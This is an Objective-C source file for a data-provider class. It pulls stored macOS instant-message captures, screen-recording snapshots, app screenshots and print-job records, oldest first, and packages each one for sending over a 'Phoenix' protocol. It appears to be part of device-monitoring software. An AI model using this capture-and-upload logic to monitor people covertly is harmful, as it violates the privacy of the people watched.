//
//  LargeRegularEventDataProvider.m
//  EDM
//
//  Created by Makara Khloth on 1/10/17.
//
//

#import "LargeRegularEventDataProvider.h"
#import "ProtocolEventConverter.h"

#import "EventRepository.h"
#import "QueryCriteria.h"
#import "EventResultSet.h"
#import "SendEvent.h"
#import "DefDDM.h"

@implementation LargeRegularEventDataProvider

@synthesize mEventRS;

- (instancetype) initWithEventRepository: (id <EventRepository>) aEventRepository eventKeysDatabase: (EventKeysDatabase *) aEventKeysDatabase {
    self = [super initWithEventKeysDatabase:aEventKeysDatabase];
    if (self) {
        mEventRepository = aEventRepository;
    }
    return self;
}

- (id) commandData {
    // Select large events
    QueryCriteria *queryCriteria = [[QueryCriteria alloc] init];
    [queryCriteria setMMaxEvent:1];
    [queryCriteria setMQueryOrder:kQueryOrderOldestFirst];
    [queryCriteria addQueryEventType:kEventTypeIMMacOS];
    [queryCriteria addQueryEventType:kEventTypeScreenRecordSnapshot];
    [queryCriteria addQueryEventType:kEventTypeAppScreenShot];
    [queryCriteria addQueryEventType:kEventTypePrintJob];
    
    self.mEventRS = [mEventRepository regularEvents:queryCriteria];
    
    [queryCriteria release];
    
    SendEvent *sendEvent = [[[SendEvent alloc] init] autorelease];
    [sendEvent setEventCount:(unsigned int)(self.mEventRS.mEventArray.count)];
    [sendEvent setEventProvider:self];
    
    mCurrentIndex = 0;
    
    return (sendEvent);
}

- (id)getObject {
    id event = [ProtocolEventConverter convertToPhoenixProtocolEvent:[self.mEventRS.mEventArray objectAtIndex:mCurrentIndex] fromThumbnail:NO];
    mCurrentIndex++;
    return (event);
}

- (BOOL)hasNext {
    BOOL hasNext = (self.mEventRS.mEventArray.count > mCurrentIndex);
    if (!hasNext) {
        EventKeys *eventKeys = [self.mEventRS shrink];
        self.mEventRS = nil;
        @try {
            [self insertEventKeys:eventKeys andEDPType:kEDPTypeAllLargeRegular];
        }
        @catch (NSException *e) {
            DLog(@"Insert event keys exception : %@", e);
        }
        @finally {
            
        }
    }
    return (hasNext);
}

- (void) dealloc {
    [mEventRS release];
    [super dealloc];
}

@end
